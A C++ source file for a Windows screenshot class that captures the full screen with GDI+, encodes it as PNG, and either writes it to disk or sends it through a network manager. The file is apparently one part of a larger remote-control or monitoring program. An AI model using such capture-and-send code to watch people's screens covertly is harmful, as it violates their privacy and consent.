#include "ScreenshotManager.h"
#include <gdiplus.h>
#include <vector>
#include <fstream>

#pragma comment(lib, "gdiplus.lib")

ScreenshotManager::ScreenshotManager() {
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
}

ScreenshotManager::~ScreenshotManager() {
    Gdiplus::GdiplusShutdown(gdiplusToken);
}

bool ScreenshotManager::CaptureScreen(std::vector<BYTE>& imageData) {
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);

    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, hBitmap);

    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

    Gdiplus::Bitmap bitmap(hBitmap, NULL);
    IStream* istream = NULL;
    CreateStreamOnHGlobal(NULL, TRUE, &istream);

    CLSID clsid;
    CLSIDFromString(L"{557CF406-1A04-11D3-9A73-0000F81EF32E}", &clsid);
    bitmap.Save(istream, &clsid);

    HGLOBAL hg;
    GetHGlobalFromStream(istream, &hg);
    imageData.resize(GlobalSize(hg));
    memcpy(imageData.data(), GlobalLock(hg), imageData.size());
    GlobalUnlock(hg);

    istream->Release();
    SelectObject(hdcMem, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    return true;
}

bool ScreenshotManager::SaveScreenshot(const std::string& filename) {
    std::vector<BYTE> imageData;
    if (!CaptureScreen(imageData)) {
        return false;
    }

    std::ofstream file(filename, std::ios::binary);
    if (!file) {
        return false;
    }

    file.write(reinterpret_cast<const char*>(imageData.data()), imageData.size());
    return true;
}

bool ScreenshotManager::SendScreenshot(NetworkManager& network) {
    std::vector<BYTE> imageData;
    if (!CaptureScreen(imageData)) {
        return false;
    }

    // Send size first
    int size = static_cast<int>(imageData.size());
    if (!network.SendData(reinterpret_cast<const char*>(&size), sizeof(size))) {
        return false;
    }

    // Send image data
    return network.SendData(reinterpret_cast<const char*>(imageData.data()), size);
} 